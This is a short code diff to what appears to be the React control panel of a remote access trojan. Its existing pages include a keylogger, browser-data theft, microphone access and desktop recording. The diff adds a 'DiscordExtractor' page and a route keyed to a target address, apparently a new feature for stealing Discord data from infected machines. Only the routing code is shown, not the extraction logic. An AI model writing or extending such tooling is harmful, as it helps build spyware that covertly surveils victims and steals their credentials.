@@ -31,6 +31,7 @@ import { Keylogger } from "./pages/Keylogger";
 import { BrowserData } from "./pages/BrowserData";
 import { MicAccess } from "./pages/MicAccess";
 import { DesktopRecording } from "./pages/DesktopRecording";
+import { DiscordExtractor } from "./pages/DiscordExtractor";
 
 const TorStartupModalContainer: React.FC = () => {
   const location = useLocation();
@@ -100,6 +101,14 @@ export const App: React.FC = () => {
           element={
             <WindowWrapper feature_cleanup={() => {}}>
               <DesktopRecording />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/discord-extractor/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <DiscordExtractor />
             </WindowWrapper>
           }
         />
